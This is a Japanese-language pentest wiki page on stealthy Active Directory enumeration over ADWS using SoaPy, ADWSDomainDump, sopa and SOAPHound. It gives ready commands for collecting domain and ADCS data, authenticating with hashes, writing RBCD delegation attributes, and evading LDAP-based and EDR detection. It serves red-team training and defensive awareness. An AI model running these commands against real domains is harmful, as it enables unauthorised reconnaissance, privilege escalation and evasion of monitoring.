# Active Directory Web Services (ADWS) の Enumeration と Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS とは？

Active Directory Web Services (ADWS) は、Windows Server 2008 R2 以降、すべての Domain Controller で**デフォルトで有効**になっており、TCP **9389** で待ち受けます。名前に反して、**HTTP は使われません**。代わりに、独自の .NET フレーミングプロトコルのスタックを通じて、LDAP 形式のデータを公開します。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

トラフィックはこれらのバイナリ SOAP フレーム内にカプセル化され、一般的ではないポートを経由するため、**ADWS 経由の enumeration は、従来の LDAP/389 および 636 のトラフィックよりも監視、フィルタリング、シグネチャ検知を受けにくくなります**。オペレーターにとっては、次のような利点があります。<sup>[[1]](#references)[[7]](#references)</sup>

* より Stealthier な recon – Blue teams は LDAP クエリに注目することが多い。
* SOCKS proxy 経由で 9389/TCP をトンネリングし、**Windows 以外のホスト（Linux、macOS）**から収集できる。
* LDAP 経由で取得できるものと同じデータ（users、groups、ACLs、schema など）に加え、**書き込み**も実行可能（例：**RBCD** 用の `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS のやり取りは WS-Enumeration 上で実装されています。各クエリは、LDAP filter/attributes を指定する `Enumerate` メッセージで始まり、`EnumerationContext` GUID を返します。その後、1 つ以上の `Pull` メッセージによって、サーバー定義の結果ウィンドウまでデータがストリーミングされます。<sup>[[7]](#references)</sup> Context は約 30 分で期限切れになるため、状態を失わないよう、ツールは結果をページングするか、filter を分割（CN ごとの prefix query）する必要があります。<sup>[[8]](#references)</sup> security descriptor を要求する場合は、`LDAP_SERVER_SD_FLAGS_OID` control を指定して SACLs を省略してください。指定しないと、ADWS は SOAP response から `nTSecurityDescriptor` attribute を単に除外します。

> 注: ADWS は多くの RSAT GUI/PowerShell ツールでも使用されるため、トラフィックが正規の管理作業に紛れ込む可能性があります。

## SoaPy – ネイティブ Python クライアント

[SoaPy](https://github.com/logangoins/soapy) は、**ADWS protocol stack を pure Python で完全に再実装したもの**です。NBFX/NBFSE/NNS/NMF フレームをバイト単位で生成するため、.NET runtime に触れることなく Unix 系システムから収集できます。<sup>[[1]](#references)[[2]](#references)</sup>

### 主な機能

* **SOCKS 経由の proxy**に対応（C2 implants からの利用に便利）。
* LDAP の `-q '(objectClass=user)'` と同じ、細かな search filter。
* オプションの**書き込み**操作（ `--set` / `--delete` ）。
* BloodHound に直接取り込める**BOFHound output mode**。<sup>[[3]](#references)</sup>
* 人が読みやすい形式が必要な場合、`--parse` flag で timestamps / `userAccountControl` を整形。<sup>[[2]](#references)</sup>

### 対象を絞った収集用 flag と書き込み操作

SoaPy には、ADWS 経由で最も一般的な LDAP hunting タスクを再現する、用途別の switch が用意されています。`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds` に加え、独自の pull 用に raw の `--query` / `--filter` オプションも利用できます。これらを `--rbcd <source>`（`msDs-AllowedToActOnBehalfOfOtherIdentity` を設定）、`--spn <service/cn>`（対象を絞った Kerberoasting 用に SPN をステージング）、`--asrep`（`userAccountControl` の `DONT_REQ_PREAUTH` を切り替え）などの書き込み機能と組み合わせます。<sup>[[2]](#references)</sup>

`samAccountName` と `servicePrincipalName` のみを返す、対象を絞った SPN hunt の例：

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

同じホストと認証情報を使って、発見した内容をただちに攻撃に利用します。`--rbcds` で RBCD 対応オブジェクトをダンプし、その後 `--rbcd 'WEBSRV01$' --account 'FILE01$'` を適用して、Resource-Based Constrained Delegation チェーンを構築します（完全な悪用手順については[Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)を参照してください）。

### インストール（オペレーターのホスト）

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – ADWS経由のLDAPDomainDump（Linux/Windows）

* `ldapdomaindump`のforkで、LDAPクエリをTCP/9389上のADWS呼び出しに置き換え、LDAP署名による検知を減らします。
* `--force`を指定しない限り、最初に9389への到達可能性を確認します（ポートスキャンのノイズが多い、またはフィルタリングされている場合は、プローブをスキップします）。
* READMEでは、Microsoft Defender for EndpointとCrowdStrike Falconに対するテストで、バイパスに成功したと報告されています。<sup>[[4]](#references)</sup>

### インストール

```bash
pipx install .
```

### 使用方法

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

一般的な出力には、9389への到達性チェック、ADWS bind、dumpの開始と終了が記録されます:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Golang向けの実用的なADWSクライアント

soapyと同様に、[sopa](https://github.com/Macmod/sopa)はGolangでADWSプロトコルスタック（MS-NNS + MC-NMF + SOAP）を実装し、次のようなADWS呼び出しを実行するためのコマンドラインフラグを提供します。<sup>[[5]](#references)</sup>

* **オブジェクトの検索と取得** - `query` / `get`
* **オブジェクトのライフサイクル管理** - `create [user|computer|group|ou|container|custom]` および `delete`
* **属性の編集** - `attr [add|replace|delete]`
* **アカウント管理** - `set-password` / `change-password`
* `groups`、`members`、`optfeature`、`info [version|domain|forest|dcs]`など

### プロトコルの対応関係の概要

* LDAP形式の検索は、属性の射影、スコープ制御（Base/OneLevel/Subtree）、ページネーションを備えた **WS-Enumeration**（`Enumerate` + `Pull`）経由で実行されます。
* 単一オブジェクトの取得には **WS-Transfer** の `Get` を使用します。属性の変更には `Put`、削除には `Delete` を使用します。
* 組み込みオブジェクトの作成には **WS-Transfer ResourceFactory** を使用します。カスタムオブジェクトには、YAMLテンプレートを使用する **IMDA AddRequest** を使用します。
* パスワード操作には **MS-ADCAP** アクション（`SetPassword`、`ChangePassword`）を使用します。<sup>[[5]](#references)</sup>

### 認証なしでのメタデータ検出（mex）

ADWSは認証情報なしでWS-MetadataExchangeを公開するため、認証前に公開状態を手早く確認できます。<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC discovery & Kerberos targeting notes

`--dc` が省略され、`--domain` が指定されている場合、Sopa は SRV を使って DC を解決できます。次の順序で問い合わせ、最も優先度の高いターゲットを使用します:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

運用上、セグメント化された環境での失敗を避けるため、DC が制御するリゾルバーを優先します。

* `--dns <DC-IP>` を使用して、すべての SRV/PTR/forward lookup を DC DNS 経由にします。
* UDP がブロックされている場合や SRV の応答が大きい場合は、`--dns-tcp` を使用します。
* Kerberos が有効で、`--dc` に IP を指定した場合、sopa は正しい SPN/KDC をターゲットにするため、FQDN を取得する目的で **reverse PTR** を実行します。Kerberos を使用しない場合、PTR lookup は発生しません。

例（IP + Kerberos、DC 経由の DNS を強制）：

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### 認証情報の選択肢

平文パスワードのほかに、sopa は **NT hashes**、**Kerberos AES keys**、**ccache**、および **PKINIT certificates**（PFX または PEM）を ADWS auth に使用できます。`--aes-key`、`-c`（ccache）、または証明書ベースのオプションを使用すると、Kerberos が自動的に使用されます。<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### templateを使用したカスタムオブジェクトの作成

任意のオブジェクトクラスの場合、`create custom`コマンドはIMDA `AddRequest`に対応するYAML templateを読み込みます:<sup>[[5]](#references)</sup>

* `parentDN`と`rdn`は、コンテナーと相対DNを定義します。
* `attributes[].name`は`cn`またはnamespacedな`addata:cn`をサポートします。
* `attributes[].type`には`string|int|bool|base64|hex`または明示的な`xsd:*`を指定できます。
* `ad:relativeDistinguishedName`や`ad:container-hierarchy-parent`は含めないでください。これらはsopaが挿入します。
* `hex`値は`xsd:base64Binary`に変換されます。空文字列を設定するには`value: ""`を使用します。

## SOAPHound – 大量のADWS収集（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)は、すべてのLDAPインタラクションをADWS内で行い、BloodHound v4互換のJSONを出力する.NET collectorです。`objectSid`、`objectGUID`、`distinguishedName`、`objectClass`の完全なcacheを一度作成し（`--buildcache`）、その後、高量の`--bhdump`、`--certdump`（ADCS）、または`--dnsdump`（AD統合DNS）の各passで再利用するため、DCから外部に送信される重要なattributeは約35個だけです。AutoSplit（`--autosplit --threshold <N>`）は、規模の大きなforestで30分のEnumerationContext timeoutを超えないよう、CN prefixでqueryを自動的に分割します。<sup>[[8]](#references)</sup>

ドメイン参加済みのoperator VMでの一般的なworkflow:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

ExportされたJSONはSharpHound/BloodHoundのworkflowに直接取り込めます。後続のグラフ化のアイデアについては、[BloodHound methodology](bloodhound.md)を参照してください。AutoSplitにより、SOAPHoundは数百万オブジェクト規模のforestでも安定して動作し、ADExplorer形式のsnapshotよりクエリ数を抑えられます。

## ステルスAD収集workflow

以下のworkflowでは、LinuxからADWS経由で**domainおよびADCSオブジェクト**を列挙し、BloodHound JSONに変換して、証明書ベースの攻撃経路を探します。

1. 対象ネットワークから自分のマシンへ9389/TCPをトンネルします（例：Chisel、Meterpreter、SSH dynamic port-forwardなどを使用）。`export HTTPS_PROXY=socks5://127.0.0.1:1080`を設定するか、SoaPyの`--proxyHost/--proxyPort`を使用します。

2. **root domainオブジェクトを収集します:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Configuration NC から ADCS 関連オブジェクトを収集する:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **BloodHoundに変換:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **ZIPをアップロード**してBloodHound GUIで開き、`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`などのcypherクエリを実行して、証明書の権限昇格経路（ESC1、ESC8など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity`の書き込み（RBCD）

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

`s4u2proxy`/`Rubeus /getticket`と組み合わせて、完全な**Resource-Based Constrained Delegation**チェーンを実行します（[Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)を参照）。

## Tooling Summary

| 目的 | Tool | 備考 |
|---------|------|-------|
| ADWSの列挙 | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、読み取り/書き込み |
| 大量のADWSダンプ | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、キャッシュ優先、BH/ADCS/DNSモード |
| BloodHoundへの取り込み | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearchのログを変換 |
| 証明書の侵害 | [Certipy](https://github.com/ly4k/Certipy) | 同じSOCKS経由でプロキシ可能 |
| ADWSの列挙とオブジェクト変更 | [sopa](https://github.com/Macmod/sopa) | 既知のADWSエンドポイントに接続する汎用クライアント。列挙、オブジェクト作成、属性変更、パスワード変更が可能 |

## References

- [1] [SpecterOps – SOAP(y)を必ず使うこと – ADWSを使ったステルス性の高いAD収集のためのオペレーター向けガイド](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX、MC-NBFSE、MS-NNS、MC-NMFの仕様](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWSを使ったActive Directory環境のステルス性の高い列挙](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS経由でActive Directoryデータを収集するツールSOAPHound](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
